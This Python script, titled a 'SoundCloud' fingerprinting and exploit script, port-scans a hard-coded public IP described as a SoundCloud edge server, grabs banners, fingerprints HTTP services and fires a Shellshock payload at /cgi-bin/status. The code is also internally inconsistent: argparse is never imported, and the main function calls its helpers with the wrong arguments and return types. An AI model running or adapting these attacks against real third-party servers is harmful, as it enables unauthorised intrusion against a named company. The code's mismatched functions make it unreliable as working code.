# SoundCloud Infrastructure Fingerprinting & Exploit Script
# ---------------------------------------------------------
# This script performs port scanning, banner grabbing, HTTP fingerprinting,
# and checks for common vulnerabilities (Shellshock) against a target IP.

import xml.etree.ElementTree as ET
import socket
import concurrent.futures
import requests

# Target IP address (SoundCloud edge server for example)
target = "143.204.29.52"  # Change to your lab IP

# Scan a single TCP port
def scan_port(port):
    try:
        sock = socket.socket()
        sock.settimeout(0.5)
        sock.connect((target, port))
        try:
            banner = sock.recv(1024).decode().strip()  # Try to read banner
        except:
            banner = "No banner"
        return f"[+] Port {port} is open: {banner}"
    except:
        return None

# Use ThreadPoolExecutor to scan all 65535 ports
with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
    futures = [executor.submit(scan_port, port) for port in range(1, 65536)]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if result:
            print(result)

# HTTP fingerprinting using GET request
def fingerprint_http(target, port):
    try:
        url = f"http://{target}:{port}"
        r = requests.get(url, timeout=2)
        print(f"[HTTP {port}] Status: {r.status_code}")
        # Try to extract HTML <title> content
        print("Title:", r.text.split("<title>")[1].split("</title>")[0] if "<title>" in r.text else "N/A")
        print("Headers:")
        for k, v in r.headers.items():
            print(f"  {k}: {v}")
    except Exception as e:
        print(f"[-] Failed to fingerprint port {port}: {e}")

# Example call to HTTP fingerprint
fingerprint_http("143.204.29.52", 80)

# Test for Shellshock vulnerability on /cgi-bin/status
def exploit_shellshock(target):
    headers = {
        "User-Agent": '() { :; }; echo; echo; /bin/bash -c "id"'
    }
    try:
        r = requests.get(f"http://{target}/cgi-bin/status", headers=headers, timeout=2)
        if "uid=" in r.text:
            print("[+] Shellshock vulnerable! Output:")
            print(r.text)
        else:
            print("[-] Not vulnerable.")
    except Exception as e:
        print("[-] Error:", e)

# Example call to Shellshock test
exploit_shellshock("143.204.29.52")

# Parse and display results from a full_scan.xml file (Nmap output)
tree = ET.parse('full_scan.xml')
root = tree.getroot()

for host in root.findall("host"):
    addr = host.find("address").attrib["addr"]
    ports = host.find("ports")
    for port in ports.findall("port"):
        portid = port.attrib["portid"]
        state = port.find("state").attrib["state"]
        if state == "open":
            print(f"[+] {addr}:{portid} is open")

# Main function with command-line argument handling and structured scan workflow
def main():
    parser = argparse.ArgumentParser(description="Python Port Scanner and Exploiter")
    parser.add_argument("target", help="Target IP or hostname")
    parser.add_argument("--full", action="store_true", help="Scan all 65535 ports")
    args = parser.parse_args()

    target = args.target
    port_range = range(1, 65536) if args.full else range(1, 1025)

    print(f"[*] Starting port scan on {target}...")
    open_ports = []

    # Multithreaded port scan
    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as executor:
        futures = [executor.submit(scan_port, target, port) for port in port_range]
        for future in concurrent.futures.as_completed(futures):
            port, is_open, banner = future.result()
            if is_open:
                print(f"[+] Port {port} is open - Banner: {banner}")
                open_ports.append((port, banner))

    print("\n[*] Starting HTTP fingerprinting...")
    # HTTP service inspection
    for port, _ in open_ports:
        if port in [80, 443, 8080, 8000]:
            info = fingerprint_http(target, port)
            if "error" not in info:
                print(f"\n[HTTP {info['port']}] Status: {info['status']}")
                print(f"Title: {info['title']}")
                print("Headers:")
                for k, v in info['headers'].items():
                    print(f"  {k}: {v}")
            else:
                print(f"[-] Port {port} fingerprint error: {info['error']}")

    print("\n[*] Testing for Shellshock...")
    result = exploit_shellshock(target)
    print(result)

# Run main() only if executed directly
if __name__ == "__main__":
    main()
